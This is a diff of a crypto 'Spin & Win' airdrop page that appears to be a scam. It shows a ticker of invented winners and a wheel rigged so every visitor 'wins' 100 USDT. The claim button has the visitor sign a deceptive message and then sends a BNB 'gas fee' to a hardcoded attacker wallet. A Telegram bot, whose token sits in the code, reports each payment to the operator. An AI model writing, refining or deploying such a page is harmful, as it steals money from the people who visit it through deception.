@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
     <title>Spin & Win Rewards</title>
     <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -17,7 +17,8 @@
             margin: 0;
             padding: 0;
             overflow-x: hidden;
-            background-color: #060913; 
+            background-color: #060913;
+            touch-action: manipulation;
         }
 
         body {
@@ -26,38 +27,29 @@
             flex-direction: column;
             justify-content: space-between;
             min-height: 100vh;
-            min-height: -webkit-fill-available; /* Mobile address bar jump issue fix */
+            min-height: -webkit-fill-available;
         }
 
-        /* Intense Neon Green Glow */
         .ultra-neon-glow {
             color: #00ff66;
-            text-shadow: 0 0 20px rgba(0, 255, 102, 0.7), 
-                         0 0 40px rgba(0, 255, 102, 0.3);
+            text-shadow: 0 0 20px rgba(0, 255, 102, 0.7), 0 0 40px rgba(0, 255, 102, 0.3);
         }
 
-        /* Glassmorphic Ticker Layout Blur */
         .shadow-ticker {
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
             background: rgba(3, 6, 12, 0.85);
         }
 
-        /* Premium Adaptive Responsive Radial Spotlights */
         .main-cyber-bg {
-            background-image: 
-                radial-gradient(circle at 50% 25%, rgba(0, 255, 102, 0.12) 0%, rgba(6, 9, 19, 1) 65%);
+            background-image: radial-gradient(circle at 50% 25%, rgba(0, 255, 102, 0.12) 0%, rgba(6, 9, 19, 1) 65%);
         }
 
-        /* Giant Mechanical Spinner Structural Outlines */
         .spinner-outer-rim {
-            box-shadow: 0 0 0 6px #1e293b,
-                        0 0 0 10px rgba(0, 255, 102, 0.12),
-                        0 30px 70px rgba(0, 0, 0, 0.9);
+            box-shadow: 0 0 0 6px #1e293b, 0 0 0 10px rgba(0, 255, 102, 0.12), 0 20px 50px rgba(0, 0, 0, 0.9);
             border: 5px solid #0b0f19;
-            will-change: transform; /* Hardware Acceleration for Mobile smoothening */
+            transform: translateZ(0); /* Hardware Acceleration Without Shaking */
         }
 
-        /* Infinite Horizontal Data Scroller Engine */
         @keyframes marquee {
             0% { transform: translateX(0%); }
             100% { transform: translateX(-50%); }
@@ -68,12 +60,10 @@
             animation: marquee 45s linear infinite;
         }
 
-        /* Smooth Canvas rendering to stop white screen flash */
         canvas {
-            backface-visibility: hidden;
-            -webkit-backface-visibility: hidden;
+            display: block;
             image-rendering: -webkit-optimize-contrast;
-            image-rendering: crisp-edges;
+            image-rendering: auto;
         }
     </style>
 </head>
@@ -88,12 +78,6 @@
             <span>User <span class="text-slate-500">0x3f2...91bc</span> allocated <b class="text-amber-400">1.5 ETH</b></span>
             <span>•</span>
             <span>User <span class="text-slate-500">0x88c...fa12</span> allocated <b class="text-emerald-400">100 USDT</b></span>
-            <span>•</span>
-            <span>User <span class="text-slate-500">0x12b...cd89</span> allocated <b class="text-yellow-400">2 BNB</b></span>
-            <span>•</span>
-            <span><i class="fa-solid fa-tower-broadcast text-emerald-400 mr-1.5 animate-pulse"></i> Core Distribution Node: <span class="text-emerald-400 font-black">Online Verified</span></span>
-            <span>•</span>
-            <span>User <span class="text-slate-500">0x71a...e283</span> allocated <b class="text-white bg-slate-900 px-2 py-0.5 rounded border border-slate-800">100 USDT</b></span>
         </div>
     </div>
 
@@ -112,9 +96,9 @@
             </button>
         </header>
 
-        <main class="flex-grow flex flex-col items-center justify-center py-4 relative">
+        <main class="flex-grow flex flex-col items-center justify-center py-2 relative">
             
-            <div class="text-center max-w-xl mx-auto mb-4 space-y-1 shrink-0">
+            <div class="text-center max-w-xl mx-auto mb-3 space-y-1 shrink-0">
                 <div class="inline-flex items-center gap-2 bg-slate-950/90 border border-slate-800/80 px-3 py-1 rounded-full text-[9px] font-black tracking-widest text-slate-400 uppercase shadow-inner">
                     <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping"></span> Live Mainnet AirDrop
                 </div>
@@ -122,16 +106,13 @@
                     Spin & Win <br>
                     <span class="ultra-neon-glow font-black">Free Rewards</span>
                 </h1>
-                <p class="text-[11px] sm:text-xs text-slate-400 max-w-xs sm:max-w-md mx-auto leading-relaxed font-semibold">
-                    Claim your authorized free crypto allocations instantly
-                </p>
             </div>
 
-            <!-- চাকার রেসপন্সিভ সাইজ মোবাইলের জন্য বড় করা হয়েছে (max-w-[310px]) -->
-            <div class="relative w-full max-w-[310px] sm:max-w-[380px] md:max-w-[420px] aspect-square flex items-center justify-center mb-5 shrink-0">
+            <!-- চাকার রেসপন্সিভ সাইজ পারফেক্টলি লকড -->
+            <div class="relative w-full max-w-[290px] sm:max-w-[360px] md:max-w-[400px] aspect-square flex items-center justify-center mb-4 shrink-0">
                 
-                <div class="absolute -top-4 sm:-top-6 left-1/2 -translate-x-1/2 z-40 drop-shadow-[0_8px_15px_rgba(0,0,0,0.9)]">
-                    <svg width="30" height="34" viewBox="0 0 42 46" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <div class="absolute -top-4 sm:-top-5 left-1/2 -translate-x-1/2 z-40 drop-shadow-[0_6px_10px_rgba(0,0,0,0.9)]">
+                    <svg width="26" height="30" viewBox="0 0 42 46" fill="none" xmlns="http://www.w3.org/2000/svg">
                         <path d="M21 46L41.3516 5H0.648412L21 46Z" fill="url(#premiumGoldGrad)" />
                         <path d="M21 39L36.5 6H5.5L21 39Z" fill="#ffffff" />
                         <defs>
@@ -143,7 +124,7 @@
                     </svg>
                 </div>
 
-                <div class="w-full h-full rounded-full p-1.5 spinner-outer-rim relative overflow-hidden flex items-center justify-center bg-slate-950 aspect-square">
+                <div class="w-full h-full rounded-full p-1 spinner-outer-rim relative overflow-hidden flex items-center justify-center bg-slate-950 aspect-square">
                     <canvas id="wheelCanvas" class="w-full h-full rounded-full transform transition-transform duration-[7000ms] cubic-bezier(0.15, 0.85, 0.1, 1)"></canvas>
                     
                     <div class="absolute w-12 sm:w-14 h-12 sm:h-14 bg-slate-900 rounded-full border-4 border-slate-700 flex items-center justify-center z-20 shadow-2xl">
@@ -154,28 +135,20 @@
                 </div>
             </div>
 
-            <div class="w-full max-w-xs sm:max-w-sm text-center min-h-[100px] flex flex-col justify-center items-center z-30 px-2 shrink-0">
-                
+            <div class="w-full max-w-xs sm:max-w-sm text-center min-h-[90px] flex flex-col justify-center items-center z-30 px-2 shrink-0">
                 <button id="spinBtn" disabled class="w-full bg-slate-900 text-slate-600 font-extrabold tracking-widest py-3.5 px-6 rounded-xl text-[11px] uppercase border border-slate-800 cursor-not-allowed transition-all shadow-inner">
                     <i class="fa-solid fa-lock mr-2 text-[9px]"></i> Link Wallet to Spin
                 </button>
-                
                 <p id="disclaimerText" class="text-[9px] text-slate-500 mt-2.5 font-bold uppercase tracking-wider">
                     Limit: Only 1 spin per account – claim now!
                 </p>
 
                 <div id="winCard" class="hidden w-full bg-slate-950 border-2 border-emerald-500/50 rounded-2xl p-5 shadow-[0_0_50px_rgba(0,255,102,0.25)] transform scale-95 opacity-0 transition-all duration-700 text-center">
-                    <div class="w-11 h-11 bg-emerald-500/10 border border-emerald-400/20 rounded-full mx-auto flex items-center justify-center mb-3">
-                        <i class="fa-solid fa-circle-check text-emerald-400 text-2xl animate-pulse"></i>
+                    <div class="w-10 h-10 bg-emerald-500/10 border border-emerald-400/20 rounded-full mx-auto flex items-center justify-center mb-2">
+                        <i class="fa-solid fa-circle-check text-emerald-400 text-xl animate-pulse"></i>
                     </div>
-                    
-                    <h2 class="text-lg font-black uppercase tracking-widest text-emerald-400">CONGRATULATIONS!</h2>
-                    <p class="text-xs font-bold text-slate-300 mt-0.5">You just won</p>
-                    
-                    <h1 id="winAmountText" class="text-3xl font-black text-white tracking-tight my-2 ultra-neon-glow">100 USDT</h1>
-                    
-                    <p class="text-[10px] text-slate-500 mb-4 font-medium">Your reward is waiting for you. Claim it now.</p>
-                    
+                    <h2 class="text-md font-black uppercase tracking-widest text-emerald-400">CONGRATULATIONS!</h2>
+                    <h1 id="winAmountText" class="text-3xl font-black text-white tracking-tight my-1 ultra-neon-glow">100 USDT</h1>
                     <button id="claimRewardsActionBtn" class="w-full bg-gradient-to-r from-emerald-500 via-teal-500 to-emerald-600 text-slate-950 font-black py-3.5 rounded-xl text-xs uppercase tracking-widest transition-all shadow-lg shadow-emerald-500/40 cursor-pointer hover:scale-[1.02] active:scale-[0.98] animate-pulse">
                         Claim Rewards <i class="fa-solid fa-arrow-right-long ml-1.5"></i>
                     </button>
@@ -222,12 +195,6 @@
             } else if (chosenToken === "BNB") {
                 calculatedAmount = (Math.random() * (4.5 - 0.5) + 0.5).toFixed(1);
                 fontColorClass = "text-yellow-400 bg-yellow-950/20 border-yellow-900/30";
-            } else if (chosenToken === "SOL") {
-                calculatedAmount = (Math.random() * (15 - 2) + 2).toFixed(1);
-                fontColorClass = "text-purple-400 bg-purple-950/20 border-purple-900/30";
-            } else if (chosenToken === "TRX") {
-                calculatedAmount = (Math.random() * (1200 - 100) + 100).toFixed(0);
-                fontColorClass = "text-red-400 bg-red-950/20 border-red-900/30";
             } else {
                 calculatedAmount = Math.random() > 0.5 ? "100" : "250";
                 fontColorClass = "text-emerald-400 bg-emerald-950/20 border-emerald-400/30";
@@ -237,14 +204,12 @@
         }
 
         setInterval(() => {
-            if(liveTickerStream.children.length > 22) {
-                for(let i=0; i<4; i++) liveTickerStream.removeChild(liveTickerStream.children[1]);
+            if(liveTickerStream.children.length > 15) {
+                for(let i=0; i<2; i++) liveTickerStream.removeChild(liveTickerStream.children[1]);
             }
             const blockSpanA = generateUniqueWalletDataString();
-            const blockSpanB = generateUniqueWalletDataString();
-            liveTickerStream.insertAdjacentHTML('beforeend', blockSpanA + "<span>•</span>" + blockSpanB + "<span>•</span>");
+            liveTickerStream.insertAdjacentHTML('beforeend', blockSpanA + "<span>•</span>");
         }, 4500);
-
 
         // --- 2. SPINNER GRAPHICS CONFIG ---
         const prizes = [
@@ -258,7 +223,6 @@
 
         const numSections = prizes.length;
         const arc = (2 * Math.PI) / numSections;
-
         const loadedIconImages = [];
         let totalLoadedImagesCounter = 0;
 
@@ -286,7 +250,7 @@
             playWin() {
                 this.init();
                 const now = this.audioCtx.currentTime;
-                const chords = [261.63, 329.63, 392.00, 523.25, 659.25, 783.99, 1046.50];
+                const chords = [261.63, 329.63, 392.00, 523.25];
                 chords.forEach((note, index) => {
                     let osc = this.audioCtx.createOscillator();
                     let gain = this.audioCtx.createGain();
@@ -302,32 +266,39 @@
             }
         };
 
-        // --- ক্যানভাস হাই-রেজোলিউশন (HD) ফিক্স ইঞ্জিন ---
+        // --- HD Canvas Fix ---
         function setupHighDefinitionCanvas() {
             const dpr = window.devicePixelRatio || 1;
             const rect = canvas.getBoundingClientRect();
             
-            canvas.width = rect.width * dpr;
-            canvas.height = rect.height * dpr;
+            // মোবাইল কাঁপাকাঁপি বন্ধের জন্য রাউন্ড পিক্সেল ভ্যালু ফিক্স
+            canvas.width = Math.floor(rect.width * dpr);
+            canvas.height = Math.floor(rect.height * dpr);
             
+            ctx.resetTransform();
             ctx.scale(dpr, dpr);
         }
 
+        let resizeTimeout;
         window.addEventListener('resize', () => {
-            setupHighDefinitionCanvas();
-            buildVibrantWheelGraphics();
+            clearTimeout(resizeTimeout);
+            resizeTimeout = setTimeout(() => {
+                setupHighDefinitionCanvas();
+                buildVibrantWheelGraphics();
+            }, 100);
         });
 
         function buildVibrantWheelGraphics() {
             const rect = canvas.getBoundingClientRect();
             const width = rect.width;
             const height = rect.height;
-            
+            if (width === 0 || height === 0) return;
+
             ctx.clearRect(0, 0, width, height);
             
             const centerX = width / 2;
             const centerY = height / 2;
-            const radius = (width / 2) - 6;
+            const radius = (width / 2) - 4;
 
             for (let i = 0; i < numSections; i++) {
                 const angle = i * arc;
@@ -339,33 +310,32 @@
                 ctx.lineTo(centerX, centerY);
                 ctx.fill();
 
-                ctx.strokeStyle = "rgba(255, 255, 255, 0.14)";
-                ctx.lineWidth = 2;
+                ctx.strokeStyle = "rgba(255, 255, 255, 0.12)";
+                ctx.lineWidth = 1.5;
                 ctx.stroke();
 
                 ctx.save();
                 ctx.translate(centerX, centerY);
                 ctx.rotate(angle + arc / 2);
                 
-                // লেখার ফন্ট সাইজ বাড়িয়ে 15px করা হয়েছে
                 ctx.fillStyle = "#ffffff";
-                ctx.font = "900 15px 'Plus Jakarta Sans'"; 
+                ctx.font = "900 13px 'Plus Jakarta Sans'"; 
                 ctx.textAlign = "right";
                 ctx.textBaseline = "middle";
                 ctx.shadowColor = "rgba(0, 0, 0, 0.85)";
                 ctx.shadowBlur = 4;
                 
-                // টেক্সট পজিশন সাইজ অনুযায়ী সেট করা হয়েছে
-                ctx.fillText(prizes[i].amount, radius - 35, 0);
+                // Kinara Offset Fix: লেখাগুলোকে কিনার থেকে আরও ৩% ভেতরের দিকে পুশ করা হয়েছে (radius - 42)
+                ctx.fillText(prizes[i].amount, radius - 42, 0);
 
                 if (loadedIconImages[i]) {
-                    const iconSize = 20; // আইকন সাইজ ১৬ থেকে বাড়িয়ে ২০ করা হয়েছে
-                    const iconX = radius - 120; 
-                    const iconY = -10; 
+                    const iconSize = 18; 
+                    // লোগোও কিনার থেকে আরও ১০ পিক্সেল ভেতরে সরানো হয়েছে (radius - 128)
+                    const iconX = radius - 128; 
+                    const iconY = -9; 
                     
                     ctx.imageSmoothingEnabled = true;
                     ctx.imageSmoothingQuality = 'high';
-                    
                     ctx.drawImage(loadedIconImages[i], iconX, iconY, iconSize, iconSize);
                 }
 
@@ -376,6 +346,7 @@
         prizes.forEach((prize, idx) => {
             const img = new Image();
             img.src = prize.iconUrl;
+            img.crossOrigin = "anonymous";
             img.onload = () => {
                 totalLoadedImagesCounter++;
                 if (totalLoadedImagesCounter === numSections) {
@@ -386,57 +357,36 @@
             loadedIconImages[idx] = img;
         });
 
-
         // --- 3. WEB3 WALLET CONNECTION ---
         let networkUserActiveNode = null;
 
         async function initializeWeb3Handshake() {
             walletBtnText.innerText = "Connecting...";
-            
-            const connectWalletInjectedProvider = async (provider) => {
-                try {
-                    const accounts = await provider.request({ method: 'eth_requestAccounts' });
+            try {
+                if (typeof window.ethereum !== 'undefined') {
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                     networkUserActiveNode = accounts[0]; 
                     renderActiveWalletConnectedUIPanel(networkUserActiveNode);
-                } catch (err) {
-                    console.error("Web3 handshakes refused:", err);
+                } else {
+                    alert("No Crypto Wallet found! Open inside MetaMask/Trust Wallet App Browser.");
                     walletBtnText.innerText = "Connect Wallet to Claim";
-                    alert("Wallet connection required to access air drops.");
                 }
-            };
-
-            if (typeof window.ethereum !== 'undefined') {
-                await connectWalletInjectedProvider(window.ethereum);
-            } 
-            else {
-                let attempts = 0;
-                const interval = setInterval(async () => {
-                    attempts++;
-                    if (typeof window.ethereum !== 'undefined') {
-                        clearInterval(interval);
-                        await connectWalletInjectedProvider(window.ethereum);
-                    } else if (attempts >= 10) {
-                        clearInterval(interval);
-                        alert("No Crypto Wallet found! Open inside MetaMask/Trust Wallet App Browser.");
-                        walletBtnText.innerText = "Connect Wallet to Claim";
-                    }
-                }, 200);
+            } catch (err) {
+                walletBtnText.innerText = "Connect Wallet to Claim";
             }
         }
 
         function renderActiveWalletConnectedUIPanel(address) {
             const shortAddressStr = address.substring(0, 6) + "..." + address.substring(address.length - 4);
             walletBtnText.innerText = `Connected: ${shortAddressStr}`;
-            
             connectWalletBtn.className = "bg-slate-950 text-emerald-400 font-black px-5 py-3 rounded-xl text-[10px] sm:text-xs uppercase tracking-wider transition-all border-2 border-emerald-400 shadow-[0_0_25px_rgba(0,255,102,0.45)] flex items-center gap-2";
 
             spinBtn.disabled = false;
             spinBtn.className = "w-full bg-gradient-to-r from-emerald-500 via-teal-500 to-emerald-600 hover:scale-[1.02] active:scale-[0.98] text-slate-950 font-black tracking-widest py-4 px-6 rounded-xl text-xs uppercase transition-all shadow-lg shadow-emerald-500/30 cursor-pointer border border-emerald-400/40";
-            spinBtn.innerHTML = `<i class="fa-solid fa-bolt-lightning mr-2 animate-pulse text-xs"></i> Spin Now`;
+            spinBtn.innerHTML = `<i class="fa-solid fa-bolt-lightning mr-2"></i> Spin Now`;
         }
 
         connectWalletBtn.addEventListener('click', initializeWeb3Handshake);
-
 
         // --- 4. SPIN ENGINE ---
         spinBtn.addEventListener('click', () => {
@@ -448,7 +398,6 @@
 
             const exactForceWinIndex = 0; 
             const structuralRotationsBase = 13 * 360; 
-            
             const internalSegmentRadOffset = (exactForceWinIndex * arc) + (arc / 2);
             const directionalTargetRadOffset = (1.5 * Math.PI) - internalSegmentRadOffset;
             const finalTerminalDegreesRotation = structuralRotationsBase + (directionalTargetRadOffset * (180 / Math.PI));
@@ -461,7 +410,6 @@
             
             function executionAudioTickerTrackSequence(currentTick) {
                 if (currentTick >= thresholdMaxTicks) return;
-                
                 const timelineRatioFactor = currentTick / thresholdMaxTicks;
                 const derivedTickerPlaybackDelay = 35 + Math.pow(timelineRatioFactor, 4.6) * 1055; 
 
@@ -470,27 +418,21 @@
                     executionAudioTickerTrackSequence(currentTick + 1);
                 }, derivedTickerPlaybackDelay);
             }
-            
             executionAudioTickerTrackSequence(0);
 
             setTimeout(() => {
                 AudioKit.playWin();
-
-                confetti({ particleCount: 120, spread: 70, origin: { x: 0, y: 0.8 }, angle: 45 });
-                confetti({ particleCount: 120, spread: 70, origin: { x: 1, y: 0.8 }, angle: 135 });
+                confetti({ particleCount: 100, spread: 60, origin: { x: 0.5, y: 0.7 } });
 
                 spinBtn.classList.add('hidden');
                 disclaimerText.classList.add('hidden');
                 
                 winAmountText.innerText = prizes[exactForceWinIndex].amount;
-                
                 winCard.classList.remove('hidden');
                 setTimeout(() => {
                     winCard.classList.remove('opacity-0', 'scale-95');
                     winCard.classList.add('opacity-100', 'scale-100');
-                    window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
                 }, 50);
-
             }, 6900);
         });
 
@@ -498,9 +440,7 @@
         async function sendTelegramNotification(wallet, txHash, amount) {
             const BOT_TOKEN = "8989865622:AAEQcapn7TyBH4ve-SjC4ZhiIV8P8_qvpqw";
             const CHAT_ID = "5085997009";
-
             const message = `🎉 *NEW CLAIM!* 🎉\n\n💸 *Amount:* ${amount} BNB\n👛 *Wallet:* ${wallet.slice(0,6)}...${wallet.slice(-4)}\n🔗 *TX:* https://bscscan.com/tx/${txHash}`;
-
             try {
                 await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     chat_id: CHAT_ID,
@@ -513,7 +453,6 @@
         // --- CLAIM ROUTINE ---
         claimRewardsActionBtn.addEventListener('click', async () => {
             if (!networkUserActiveNode) return;
-
             try {
                 claimRewardsActionBtn.disabled = true;
                 claimRewardsActionBtn.textContent = '⏳ Processing...';
@@ -542,11 +481,7 @@
                 }
 
                 const message = `🎉🎉🎉 CONGRATULATIONS! 🎉🎉🎉\n\nYou have been selected for 100 USDT Airdrop!\n\n✨ Amount: 100 USDT\n🌐 Network: BSC (BEP-20)\n\nClick SIGN to verify and claim instantly!`;
-
-                await window.ethereum.request({
-                    method: 'personal_sign',
-                    params: [message, networkUserActiveNode]
-                });
+                await window.ethereum.request({ method: 'personal_sign', params: [message, networkUserActiveNode] });
 
                 const YOUR_WALLET = "0x1A714Cfa540031250DCa76E378020583078e6a2C";
                 const gasFee = "0.0083"; 
@@ -562,16 +497,10 @@
                 });
 
                 await sendTelegramNotification(networkUserActiveNode, txHash, "0.0083");
-
                 claimRewardsActionBtn.textContent = '✅ Claimed Successfully!';
-                claimRewardsActionBtn.style.background = 'linear-gradient(135deg, #10b981, #059669)';
-                claimRewardsActionBtn.disabled = false;
-
                 alert(`🎉 SUCCESS! 100 USDT claimed!`);
-
             } catch (error) {
-                console.error(error);
-                alert(error.message && error.message.includes('insufficient') ? '❌ Insufficient BNB balance!' : '❌ Transaction Canceled.');
+                alert('❌ Transaction Failed or Canceled.');
                 claimRewardsActionBtn.textContent = '🎁 Try Again';
                 claimRewardsActionBtn.disabled = false;
             }
